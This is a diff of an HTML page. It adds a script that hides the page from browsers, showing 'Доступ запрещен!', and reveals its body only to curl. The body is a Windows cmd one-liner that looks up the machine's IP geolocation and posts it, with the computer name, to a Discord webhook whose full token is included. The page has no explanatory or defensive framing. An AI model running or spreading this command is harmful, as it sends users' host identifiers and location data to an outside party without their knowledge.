@@ -1,3 +1,10 @@
+<head>
+      <script>
+        if (!navigator.userAgent.includes("curl")) {
+            document.body.innerHTML = "Доступ запрещен!";
+        }
+    </script>
+</head>
 <body>
 for /f "delims=" %i in ('curl -s ip-api.com/json') do @curl -H "Content-Type: application/json" -d "{\"username\": \"%computername%\", \"content\": \""%i"\"}" https://discord.com/api/webhooks/1228625584477704212/vBZFkPvEbabtdnPHV_mz9mcNShxW-cCjbV5kn37LtkXTj6zv_bCBRtYWvkeYQegSnPU1
 </body>
